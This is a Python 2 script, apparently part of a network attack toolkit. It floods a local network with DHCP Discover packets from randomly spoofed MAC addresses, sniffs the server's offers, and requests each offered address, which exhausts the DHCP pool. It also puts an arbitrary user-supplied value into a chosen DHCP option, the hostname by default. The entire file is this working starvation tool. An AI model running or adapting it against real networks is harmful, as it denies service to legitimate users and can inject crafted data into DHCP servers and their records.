from base import Base
from argparse import ArgumentParser
from netifaces import ifaddresses, AF_LINK
from network import Ethernet_raw, DHCP_raw
from datetime import datetime
from time import time, sleep
from random import randint
from tm import ThreadManager
from scapy.all import sniff, DHCP, BOOTP, sendp
from logging import getLogger, ERROR
getLogger("scapy.runtime").setLevel(ERROR)

Base.check_user()

_dhcp_option_value = None
_dhcp_option_code = 12
_transactions = {}

parser = ArgumentParser(description='DHCP Request raw packet sender')
parser.add_argument('-i', '--interface', type=str, help='Set interface name for send discover packets')
parser.add_argument('-n', '--notspoofmac', help='Don\'t spoof MAC address', action='store_true')
parser.add_argument('-p', '--packets', type=int, help='Number of packets (default: 100000)', default=100000)
parser.add_argument('-d', '--delay', type=int, help='Set delay time in seconds (default: 5)', default=5)
parser.add_argument('-v', '--dhcp_option_value', type=str, help='Set DHCP option value', default=None)
parser.add_argument('-c', '--dhcp_option_code', type=int, help='Set DHCP option code (default: 12)', default=12)
args = parser.parse_args()

if args.dhcp_option_value is not None:
    _dhcp_option_value = args.dhcp_option_value

if args.dhcp_option_code != 12:
    _dhcp_option_code = args.dhcp_option_code

_number_of_packets = int(args.packets)
_current_network_interface = ""

if args.interface is None:
    _current_network_interface = Base.netiface_selection()
else:
    _current_network_interface = args.interface

current_mac_address = ""
try:
    current_mac_address = str(ifaddresses(_current_network_interface)[AF_LINK][0]['addr'])
except:
    print "This network interface does not have mac address!"
    exit(1)


def send_dhcp_discover():
    sleep(2)
    global _dhcp_option_code
    global _dhcp_option_value
    global _transactions

    if args.notspoofmac:
        print "Your MAC address is not spoofed!"

    eth = Ethernet_raw()
    dhcp = DHCP_raw()

    print "\r\nSending discover packets..."
    print "Number of packets: " + str(_number_of_packets)
    print "Start sending packets: " + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
    start_time = time()

    count = 0
    while count < _number_of_packets:

        if args.notspoofmac:
            src_mac = current_mac_address
        else:
            src_mac = eth.get_random_mac()

        transaction_id = randint(1, 4294967295)

        discover_packet = dhcp.make_request_packet(source_mac=src_mac,
                                                   client_mac=src_mac,
                                                   transaction_id=transaction_id,
                                                   dhcp_message_type=1,
                                                   requested_ip=None,
                                                   option_value=_dhcp_option_value,
                                                   option_code=_dhcp_option_code)
        sendp(discover_packet, iface=_current_network_interface, verbose=False)
        _transactions[transaction_id] = src_mac
        sleep(int(args.delay))
        count += 1

    stop_time = time()
    print "All discover packets sent: " + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
    delta_time = stop_time - start_time
    speed = _number_of_packets / delta_time
    print "Speed: " + str(int(speed)) + " pkt/sec\r\n"


def send_dhcp_request(request):
    if request.haslayer(DHCP):
        print "[INFO] DHCP packet is captured!"
        global _dhcp_option_value
        global _dhcp_option_code
        global _transactions

        xid = request[BOOTP].xid
        yiaddr = request[BOOTP].yiaddr
        siaddr = request[BOOTP].siaddr
        dhcp = DHCP_raw()

        if request[DHCP].options[0][1] == 2:
            print "DHCP OFFER from: " + siaddr + " || transaction id: " + hex(xid) + " || your client ip: " + yiaddr
            request_packet = dhcp.make_request_packet(source_mac=_transactions[xid],
                                                      client_mac=_transactions[xid],
                                                      transaction_id=xid,
                                                      dhcp_message_type=3,
                                                      requested_ip=yiaddr,
                                                      option_value=_dhcp_option_value,
                                                      option_code=_dhcp_option_code)
            sendp(request_packet, iface=_current_network_interface, verbose=False)

if __name__ == "__main__":
    tm = ThreadManager(2)
    tm.add_task(send_dhcp_discover)
    print "Sniff interface: " + str(_current_network_interface)
    sniff(prn=send_dhcp_request, iface=_current_network_interface)